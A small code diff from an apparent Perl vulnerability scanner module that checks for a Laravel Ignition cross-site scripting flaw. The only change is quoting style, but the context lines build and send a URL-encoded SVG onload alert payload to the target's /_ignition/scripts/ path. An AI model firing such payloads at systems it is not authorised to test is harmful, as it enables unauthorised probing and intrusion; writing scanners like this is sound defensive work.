@@ -21,7 +21,7 @@ package Spellbook::Advisory::Laravel_Ignition_XSS {
                 $target = "https://$target";
             }
 
-            my @uuid      = Spellbook::Helper::Generate_UUID -> new(["--version" => 4, "--repeat" => 1]);
+            my @uuid      = Spellbook::Helper::Generate_UUID -> new(['--version' => 4, '--repeat' => 1]);
             my $payload   = "$target/_ignition/scripts/--%3E%3Csvg%20onload=alert%28$uuid[0]%29%3E";
             my $user_agent = Spellbook::Core::UserAgent -> new();
             my $request   = $user_agent -> get($payload);
